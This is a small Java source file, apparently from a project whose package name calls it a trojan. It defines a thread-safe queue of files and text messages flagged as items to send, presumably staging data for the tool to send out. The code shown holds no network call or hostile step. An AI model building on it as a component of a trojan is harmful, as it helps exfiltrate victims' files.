package dev.px.trojan.Connections;

import java.io.File;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;

public class FileQueue {

    private Queue<File> files;
    private Queue<String> textList;

    public FileQueue() {
        this.files = new ConcurrentLinkedQueue<>();
        this.textList = new ConcurrentLinkedQueue<>();
    }

    public void addFile(File file) {
        this.files.add(file);
    }

    public void addMessage(String text) {
        this.textList.add(text);
    }

    public void clearQueue() {
        this.files.clear();
        this.textList.clear();
    }

    public boolean isItemsToSend() {
        return this.files.size() > 0 || textList.size() > 0;
    }
}
